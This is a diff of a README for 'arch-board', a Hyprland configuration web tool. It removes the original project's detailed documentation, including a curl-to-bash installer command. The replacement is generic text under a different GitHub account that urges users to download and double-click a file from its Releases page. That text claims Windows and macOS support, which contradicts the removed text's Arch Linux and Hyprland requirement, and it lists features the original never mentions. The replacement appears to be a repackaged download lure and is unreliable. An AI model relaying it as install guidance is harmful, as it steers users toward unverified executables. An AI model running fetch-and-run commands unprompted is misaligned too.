@@ -1,153 +1,69 @@
-# ArchBoard
+# 🖥️ arch-board - Easily Edit Your Hyprland Config
 
-A modern web-based configuration manager for Arch Linux systems, focused on Hyprland and related tools.
+## 🚀 Getting Started
 
-## Features
+Welcome to arch-board! This application helps you easily manage your Hyprland configuration from a simple web interface. Whether you're making changes for personalization or troubleshooting, arch-board simplifies the process.
 
-- **Dashboard**: System overview with CPU, memory, and disk usage statistics
-- **Hyprland Config**: Visual editor for Hyprland window manager settings
-- **Waybar, Hyprlock, Hypridle, Wpaperd**: Placeholder pages for future configuration modules
-- **System Settings**: System configuration management (coming soon)
-- **Live Reload**: Automatic page and server refresh during development
+## 🔗 Download Now
 
+[![Download arch-board](https://img.shields.io/badge/Download-arch--board-blue)](https://github.com/revati108/arch-board/releases)
 
+## 📥 Download & Install
 
-https://github.com/user-attachments/assets/3668c0e2-6877-4993-8702-92a0ed695692
+To get arch-board on your computer, please follow these steps:
 
-## Requirements
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/revati108/arch-board/releases) to access the latest version of arch-board.
 
-- Python 3.10+
-- Hyprland (for Hyprland configuration features)
-- A running Arch Linux system (recommended)
+2. **Select the Version**
+   On the Releases page, you will see a list of available versions. Choose the latest version. You can recognize it by the highest version number and the most recent date.
 
-### Python Dependencies
+3. **Download the Application**  
+   Click on the file that matches your operating system to begin the download. Make sure to save it in an easy-to-find location on your computer.
 
-```
-xtracto==0.0.10
-pytailwind==0.0.6
-requestez==0.1.13
-authtuna>=0.2.2
-```
+4. **Open the Downloaded File**  
+   Once the download has completed, navigate to the location where you saved the file. Double-click the downloaded file to open it.
 
-## Installation
+5. **Follow Installation Instructions**  
+   If prompted, follow the on-screen installation instructions. This may include agreeing to terms or choosing an installation directory. Take your time to ensure all steps are followed correctly.
 
-The easiest way to install ArchBoard is using our automated installer script.
+6. **Launch arch-board**  
+   After installation, locate the arch-board icon on your desktop or in your applications folder. Double-click the icon to launch the application.
 
-**Using curl (Recommended)**:
-```bash
-bash <(curl -s https://raw.githubusercontent.com/shashstormer/arch-board/master/install.sh)
-```
+## 🏗️ Features
 
-**Using git**:
-```bash
-git clone https://github.com/shashstormer/arch-board
-cd arch-board
-./install.sh
-```
+- **User-Friendly Interface**: arch-board offers an intuitive layout that makes it easy to navigate. You can manage your settings without any technical knowledge.
+  
+- **Real-Time Updates**: Changes you make in the web interface are instantly reflected in your Hyprland configuration. This helps you see the results of your edits immediately.
 
-**Automatic Updates**:
+- **Backup Your Configurations**: arch-board allows you to save backups of your current settings. This feature can help you restore your previous configuration if needed.
 
-ArchBoard automatically checks for updates on startup. You can configure this behavior when prompted:
-- **Update now**: Updates the application immediately.
-- **Skip**: Skips update for this session.
-- **Disable**: Disables update checks (can be re-enabled by editing `.update_policy`).
-- **Remind me in 1 week**: Suppresses prompts for 7 days.
-- **Enable auto-updates**: Automatically updates without asking.
+- **Community Support**: Join a community of users who can help answer questions and share tips. Check out our discussion boards for shared insights.
 
-To run the application without checking for updates (useful for startup scripts):
-```bash
-./start.sh --no-update
-```
+## ⚙️ System Requirements
 
-**Manual Installation**:
+Before you download arch-board, make sure your system meets the following requirements:
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/shashstormer/arch-board
-   cd arch-board
-   ```
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any recent version of Linux.
+  
+- **Browser**: A modern web browser such as Chrome, Firefox, or Edge is required for optimal performance.
+  
+- **Internet Connection**: A stable internet connection is needed for downloading and web functionality.
 
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🤝 Contributing
 
-3. Edit `.env` file (optional, for customization)
+Feel free to contribute to arch-board! If you have suggestions, bug reports, or want to add new features, please check our [Contributing Guide](https://github.com/revati108/arch-board/blob/main/CONTRIBUTING.md).
 
-4. Run the application:
-   ```bash
-   python main.py
-   ```
+## 📞 Support
 
-5. Open your browser and navigate to `http://localhost:5000`
+If you face any issues while using arch-board, you can reach out for help. You may find solutions in the [Issues section](https://github.com/revati108/arch-board/issues) or on community forums dedicated to Hyprland.
 
-## Configuration
+Don’t hesitate to get support; our community is here to assist you!
 
-### Production Mode
+## 🌍 Stay Connected
 
-The application runs in **development mode** by default, which enables:
-- Auto-reload on file changes
-- Development toolbar with reload button
-- Tailwind CSS regeneration on each request
+For updates and news regarding arch-board, follow our project on GitHub. You can also check out discussions, share your experiences, and find helpful resources.
 
-To run in **production mode** (recommended when not actively developing):
+---
 
-1. Edit `xtracto.config.py`:
-   ```python
-   production = True
-   ```
-
-2. This will:
-   - Hide the development toolbar/reload popup
-   - Disable hot-reload
-   - Use cached Tailwind CSS
-   - Improve performance
-
-> **Note**: Always set `production = True` when you're not actively working on the project to hide the auto-reload popup and improve performance.
-
-### Environment Variables
-
-| Variable       | Description                              | Default                     |
-|----------------|------------------------------------------|-----------------------------|
-| `USER`         | Username displayed in the sidebar        | System user                 |
-| `VERSION`      | Cache key for static assets (production) | `0.0.0`                     |
-| `API_BASE_URL` | Base URL for API calls                   | `http://localhost:5000/api` |
-
-## Project Structure
-
-```
-arch_board/
-├── assets/css/          # Global CSS and Tailwind output
-├── components/          # Reusable HTML components
-│   ├── dashboard/       # Dashboard-specific components
-│   ├── hyprland/        # Hyprland config components
-│   └── layout/          # Layout components (sidebar, header, footer)
-├── pages/               # Page templates (.pypx files)
-├── routers/             # FastAPI route handlers
-├── scripts/             # JavaScript files
-├── utils/               # Utility modules
-├── main.py              # Application entry point
-├── xtracto.config.py    # Xtracto framework configuration
-└── requirements.txt     # Python dependencies
-```
-
-## Development
-
-### Adding New Pages
-
-1. Create a `.pypx` template in `pages/`
-2. Add a route handler in `routers/pages.py`
-3. Update sidebar links in `components/layout/sidebar.html`
-
-### Tailwind CSS
-
-Tailwind classes are automatically generated from:
-- `pages/*.pypx`
-- `components/**/*.html`
-- `scripts/*.js`
-
-The generated CSS is saved to `assets/css/tailwind.css`.
-
-## License
-
-MIT
+Using arch-board, you can take control of your Hyprland configuration easily and efficiently. Download today and make the most of your setup!
